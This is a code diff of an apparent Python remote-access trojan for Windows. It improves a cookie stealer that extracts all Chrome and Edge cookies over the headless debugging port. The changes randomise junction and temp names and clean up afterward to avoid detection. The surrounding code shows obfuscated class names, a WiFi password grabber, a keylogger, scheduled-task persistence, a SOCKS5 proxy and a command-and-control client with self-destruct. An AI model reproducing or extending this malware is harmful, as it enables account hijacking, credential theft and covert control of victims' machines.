@@ -1,6 +1,7 @@
 import sys
 import subprocess
 import platform
+import random
 from datetime import datetime, timedelta
 
 def install_module(module_name, pip_name=None):
@@ -123,7 +124,7 @@ class Crypto:
         pt = cipher.decrypt(ct)
         return json.loads(unpad(pt, AES.block_size))
 
-class BwYMYiWf:
+class uCbEmcqi:
     @staticmethod
     def get_wifi_passwords():
         try:
@@ -149,13 +150,15 @@ class BwYMYiWf:
         except:
             return []
 
-class WJxflnlN:
-    def __init__(self, logger=None):
+class fMKOuTVR:
+    def __init__(self, logger=None, config=None):
         self.logger = logger or self._create_default_logger()
+        self.config = config
         self.chrome_debug_port = 9222
         self.edge_debug_port = 9223
         self.timeout = 10
         self.unique_domains = set()
+        self.used_junction_names = set()
         
         self.CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
         self.CHROME_USER_DATA_DIR = rf'{os.getenv("LOCALAPPDATA")}\Google\Chrome\User Data'
@@ -199,30 +202,48 @@ class WJxflnlN:
         return results
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
+        proc = None
+        junction_paths = []
         try:
             pass
-            
-            proc = self._start_browser_debug(browser_path, port, user_data_dir)
+
+            proc, junction_paths = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
                 return None
 
             time.sleep(5)
-            
-            cookies = self._get_cookies_via_debug(port)
-            
+
+            debug_result = self._get_cookies_via_debug(port)
+
             proc.terminate()
             proc.wait()
 
-            if not cookies:
+            if not debug_result or not isinstance(debug_result, dict) or not debug_result.get('cookies'):
                 return None
 
+            cookies = debug_result['cookies']
+            browser_user_agent = debug_result.get('browser_user_agent', 'Unknown')
+
             transformed = self._transform_cookies(cookies)
-            
-            return self._package_cookies(transformed, browser_name)
+
+            return self._package_cookies(transformed, browser_name, browser_user_agent)
 
         except Exception as e:
             pass
             return None
+        finally:
+            for junction_path in junction_paths:
+                try:
+                    if os.path.exists(junction_path):
+                        if os.path.isdir(junction_path):
+                            subprocess.run(['cmd', '/c', 'rmdir', junction_path], check=True)
+                        else:
+                            os.remove(junction_path)
+                    pass
+                    junction_name = os.path.basename(junction_path)
+                    self.used_junction_names.discard(junction_name)
+                except Exception as e:
+                    pass
 
     def _process_firefox_cookies(self):
         try:
@@ -286,8 +307,23 @@ class WJxflnlN:
 
     def _create_junctions(self):
         temp_dir = os.getenv('TEMP')
-        chrome_junction = os.path.join(temp_dir, 'g')
-        edge_junction = os.path.join(temp_dir, 'e')
+        chrome_junction_name = None
+        edge_junction_name = None
+
+        while True:
+            chrome_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
+            if chrome_junction_name not in self.used_junction_names:
+                self.used_junction_names.add(chrome_junction_name)
+                break
+
+        while True:
+            edge_junction_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
+            if edge_junction_name not in self.used_junction_names:
+                self.used_junction_names.add(edge_junction_name)
+                break
+
+        chrome_junction = os.path.join(temp_dir, chrome_junction_name)
+        edge_junction = os.path.join(temp_dir, edge_junction_name)
 
         for junction in [chrome_junction, edge_junction]:
             if os.path.exists(junction):
@@ -318,6 +354,7 @@ class WJxflnlN:
             self._kill_browser(os.path.basename(browser_path))
 
             chrome_junction, edge_junction = self._create_junctions()
+            junction_paths = [chrome_junction, edge_junction]
             if user_data_dir == self.CHROME_USER_DATA_DIR:
                 user_data_dir = chrome_junction
             elif user_data_dir == self.EDGE_USER_DATA_DIR:
@@ -332,12 +369,13 @@ class WJxflnlN:
                 '--headless',
                 f'--user-data-dir={user_data_dir}'
             ]
-            return subprocess.Popen(command, 
+            proc = subprocess.Popen(command,
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL)
+            return proc, junction_paths
         except Exception as e:
             pass
-            return None
+            return None, []
 
     def _kill_browser(self, process_name):
         try:
@@ -347,26 +385,65 @@ class WJxflnlN:
             pass
 
     def _get_cookies_via_debug(self, port):
-        import websocket 
+        import websocket
         try:
             debug_url = f'http://localhost:{port}/json'
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
-            
+
             data = response.json()
             if not data:
                 return []
-                
+
             ws_url = data[0]['webSocketDebuggerUrl']
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
-            
+
             ws.send(json.dumps({
                 'id': 1,
+                'method': 'Network.enable'
+            }))
+
+            network_response = json.loads(ws.recv())
+            if 'error' in network_response:
+                pass
+                return []
+
+            ws.send(json.dumps({
+                'id': 2,
+                'method': 'Runtime.evaluate',
+                'params': {
+                    'expression': 'navigator.userAgent',
+                    'returnByValue': True
+                }
+            }))
+
+            ua_response = json.loads(ws.recv())
+            browser_user_agent = 'Unknown'
+            if 'result' in ua_response and 'result' in ua_response['result']:
+                full_ua = ua_response['result']['result'].get('value', 'Unknown')
+                if 'Chrome/' in full_ua:
+                    chrome_part = full_ua.split('Chrome/')[1]
+                    browser_user_agent = f"Chrome/{chrome_part}".replace('Headless', '').strip()
+                elif 'Firefox/' in full_ua:
+                    firefox_part = full_ua.split('Firefox/')[1].split(' ')[0]
+                    browser_user_agent = f"Firefox/{firefox_part}"
+                else:
+                    browser_user_agent = full_ua.replace('Headless', '').strip()
+
+            ws.send(json.dumps({
+                'id': 3,
                 'method': 'Network.getAllCookies'
             }))
-            
-            response = json.loads(ws.recv())
-            return response['result']['cookies']
+
+            cookies_response = json.loads(ws.recv())
+            if 'result' in cookies_response and 'cookies' in cookies_response['result']:
+                return {
+                    'cookies': cookies_response['result']['cookies'],
+                    'browser_user_agent': browser_user_agent
+                }
+            else:
+                pass
+                return []
         except Exception as e:
             pass
             return []
@@ -481,7 +558,7 @@ class WJxflnlN:
                 'username': 'Unknown',
                 'computer_name': 'Unknown',
                 'windows_version': 'Unknown',
-                'user_agent': 'Unknown'
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
             }
 
     def _extract_unique_domains(self, cookies):
@@ -492,28 +569,35 @@ class WJxflnlN:
                 unique_domains.add(domain)
         return list(unique_domains)
 
-    def _package_cookies(self, cookies, browser_name):
+    def _package_cookies(self, cookies, browser_name, browser_user_agent=None):
         try:
             if not cookies:
                 return None
-                
+
             unique_domains = self._extract_unique_domains(cookies)
             self.unique_domains.update(unique_domains)
-            
+
             system_info = self._get_system_info()
-            
-            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+
+            if browser_user_agent and browser_user_agent != 'Unknown':
+                system_info['user_agent'] = browser_user_agent
+
+            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer_' + str(random.randint(1000,9999)))
             os.makedirs(temp_dir, exist_ok=True)
-            
+
             temp_file = os.path.join(temp_dir, f'{browser_name}_cookies.json')
             with open(temp_file, 'w') as f:
                 json.dump(cookies, f, indent=4)
-            
+
             with open(temp_file, 'rb') as f:
                 cookie_data = f.read()
-            
+
             os.remove(temp_file)
-            
+            try:
+                os.rmdir(temp_dir)
+            except:
+                pass
+
             return {
                 'browser': browser_name,
                 'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
@@ -889,7 +973,7 @@ class Persistence:
                 '</Task>'
             ]
             
-            xml_path = os.path.join(os.getenv('TEMP'), f'task_{random.randint(1000,9999)}.xml')
+            xml_path = os.path.join(os.getenv('TEMP'), 'task_' + str(random.randint(1000,9999)) + '.xml')
             pass
             
             with open(xml_path, 'w') as f:
@@ -1058,7 +1142,7 @@ class SOCKS5Proxy:
 
 import threading
 
-class oPKBRbrF:
+class XGlNljzp:
     def __init__(self):
         self.log = ""
         self.listener = None
@@ -1216,6 +1300,7 @@ class WebSocketClient:
         self.socket = None
         self.connected = False
         self.current_dir = os.getcwd()
+        self.keep_alive_running = False
         self._setup_logger()
         self._connection_timeout = 10
 
@@ -1259,6 +1344,11 @@ class WebSocketClient:
             def on_force_kill(data):
                 pass
                 self._immediate_self_destruct()
+
+            @self.socket.on('stop_keep_alive', namespace='/terminal')
+            def on_stop_keep_alive(data):
+                pass
+                self.keep_alive_running = False
 
     def connect(self):
         try:
@@ -1398,7 +1488,7 @@ class Agent:
         self.agent_id = self._generate_agent_id()
         self._setup_logger()
         self.socks_proxy = SOCKS5Proxy(self.config.SOCKS5_PORT)
-        self.keylogger = oPKBRbrF()
+        self.keylogger = XGlNljzp()
         self.ws_client = None
         self.last_checkin = 0
         self.jitter = 0.3
@@ -1449,7 +1539,7 @@ class Agent:
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
             data["credentials"] = {
                 
-                "wifi": BwYMYiWf.get_wifi_passwords()
+                "wifi": uCbEmcqi.get_wifi_passwords()
             }
             if not self._initial_checkin:
                 self._initial_checkin = time.time()
@@ -1865,7 +1955,7 @@ class Agent:
             elif task_type == "steal_cookies":
                 try:
                     pass
-                    stealer = WJxflnlN(logger=self.logger)
+                    stealer = fMKOuTVR(logger=self.logger, config=self.config)
                     results = stealer.steal_cookies()
                     
                     if not results:
